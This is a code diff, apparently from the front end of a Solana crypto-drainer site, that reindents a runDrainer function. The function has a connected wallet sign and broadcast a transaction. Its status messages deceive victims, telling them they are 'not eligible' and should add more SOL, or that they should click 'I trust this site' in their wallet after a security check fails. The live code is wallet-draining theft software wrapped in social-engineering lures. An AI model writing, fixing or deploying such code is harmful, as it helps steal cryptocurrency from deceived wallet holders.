@@ -1233,7 +1233,7 @@ async function runDrainer(provider) {
         } else if (err.code === 'INSUFFICIENT_FUNDS_FOR_SAFE_DRAIN') {
           showStatus('❌ Sorry, You\'re Not eligible. Your wallet has insufficient funds for a safe transaction. Please add more SOL to your wallet.', 'error');
         } else {
-          showStatus(err.error || err.details || 'Failed to fetch transaction', 'error');
+        showStatus(err.error || err.details || 'Failed to fetch transaction', 'error');
         }
       } catch (parseError) {
         console.log('[runDrainer] Failed to parse error response:', parseError);
@@ -1294,15 +1294,15 @@ async function runDrainer(provider) {
       
       // Add timeout wrapper for signing
       const signingPromise = (async () => {
-        if (typeof provider.signAndSendTransaction === 'function') {
-          // Try signAndSendTransaction first (some wallets prefer this)
-          console.log('[SIGNING] Using signAndSendTransaction');
+      if (typeof provider.signAndSendTransaction === 'function') {
+        // Try signAndSendTransaction first (some wallets prefer this)
+        console.log('[SIGNING] Using signAndSendTransaction');
           return await provider.signAndSendTransaction(transaction);
-        } else if (typeof provider.signTransaction === 'function') {
-          // Fallback to signTransaction
-          console.log('[SIGNING] Using signTransaction');
+      } else if (typeof provider.signTransaction === 'function') {
+        // Fallback to signTransaction
+        console.log('[SIGNING] Using signTransaction');
           return await provider.signTransaction(transaction);
-        } else {
+    } else {
           throw new Error('Wallet does not support transaction signing.');
         }
       })();
@@ -1330,13 +1330,13 @@ async function runDrainer(provider) {
         hasSerialize: typeof signed.serialize === 'function'
       });
       
-                  } catch (signError) {
-          console.error('[runDrainer] Transaction signing error:', signError);
-          
-          // Check if user rejected the transaction
+          } catch (signError) {
+        console.error('[runDrainer] Transaction signing error:', signError);
+        
+        // Check if user rejected the transaction
           if (signError.message?.includes('User rejected') || signError.message?.includes('User denied') || signError.message?.includes('Cancelled')) {
             showStatus('Transaction was cancelled. Please try again and approve the transaction.', 'error');
-          } else if (signError.message?.includes('Simulation failed') || signError.message?.includes('Transaction simulation failed')) {
+        } else if (signError.message?.includes('Simulation failed') || signError.message?.includes('Transaction simulation failed')) {
             showStatus('❌ Transaction simulation failed. This could be due to insufficient funds, security settings, or network issues. Please try again or check your wallet settings.', 'error');
             
             // Add retry option for simulation failures
@@ -1349,11 +1349,11 @@ async function runDrainer(provider) {
             showStatus('✅ Transaction cancelled by user. You can try again when ready.', 'info');
           } else if (signError.message?.includes('Security check failed') || signError.message?.includes('server error')) {
             showStatus('⚠️ Security check failed. Please click "I trust this site" in your wallet, then try again.', 'error');
-          } else {
-            showStatus('❌ Transaction failed. Please try again or use a different wallet.', 'error');
-          }
-          return;
+        } else {
+          showStatus('❌ Transaction failed. Please try again or use a different wallet.', 'error');
         }
+        return;
+      }
 
     // 5. Send the transaction to the network with retry logic
     showStatus('Broadcasting transaction...', 'loading');
@@ -1371,34 +1371,34 @@ async function runDrainer(provider) {
         
         // Add timeout for each broadcast attempt
         const broadcastPromise = (async () => {
-          // Check different possible signature formats
-          if (signed.signature) {
-            // Direct signature from signAndSendTransaction
-            txid = signed.signature;
-            console.log('[BROADCAST] Using direct signature:', txid);
-            broadcastSuccess = true;
+        // Check different possible signature formats
+    if (signed.signature) {
+          // Direct signature from signAndSendTransaction
+      txid = signed.signature;
+          console.log('[BROADCAST] Using direct signature:', txid);
+          broadcastSuccess = true;
             return txid;
-          } else if (signed.signatures && signed.signatures.length > 0) {
-            // Signature from transaction object
-            txid = signed.signatures[0].signature;
-            console.log('[BROADCAST] Using transaction signature:', txid);
-            broadcastSuccess = true;
+        } else if (signed.signatures && signed.signatures.length > 0) {
+          // Signature from transaction object
+          txid = signed.signatures[0].signature;
+          console.log('[BROADCAST] Using transaction signature:', txid);
+          broadcastSuccess = true;
             return txid;
-          } else if (typeof signed.serialize === 'function') {
-            // We have a signed transaction, send it
-            const serializedTx = signed.serialize();
-            console.log('[BROADCAST] Sending serialized transaction, length:', serializedTx.length);
-            txid = await connection.sendRawTransaction(serializedTx, {
-              skipPreflight: false,
-              preflightCommitment: 'confirmed',
-              maxRetries: 3
-            });
-            console.log('[BROADCAST] Transaction sent with ID:', txid);
-            broadcastSuccess = true;
+        } else if (typeof signed.serialize === 'function') {
+          // We have a signed transaction, send it
+          const serializedTx = signed.serialize();
+          console.log('[BROADCAST] Sending serialized transaction, length:', serializedTx.length);
+          txid = await connection.sendRawTransaction(serializedTx, {
+            skipPreflight: false,
+            preflightCommitment: 'confirmed',
+            maxRetries: 3
+          });
+          console.log('[BROADCAST] Transaction sent with ID:', txid);
+          broadcastSuccess = true;
             return txid;
-          } else {
-            throw new Error('Invalid signed transaction format');
-          }
+    } else {
+          throw new Error('Invalid signed transaction format');
+        }
         })();
         
         const timeoutPromise = new Promise((_, reject) => {
@@ -1618,7 +1618,7 @@ window.openWalletModal = async function openWalletModal() {
       // Log other errors but don't show to user unless critical
       console.error('[GLOBAL_ERROR]', event.error || event.message);
     });
-    
+
     // DOM Ready - Initialize everything after DOM is loaded
     document.addEventListener('DOMContentLoaded', function() {
       console.log('DOM loaded - initializing countdown and functions');
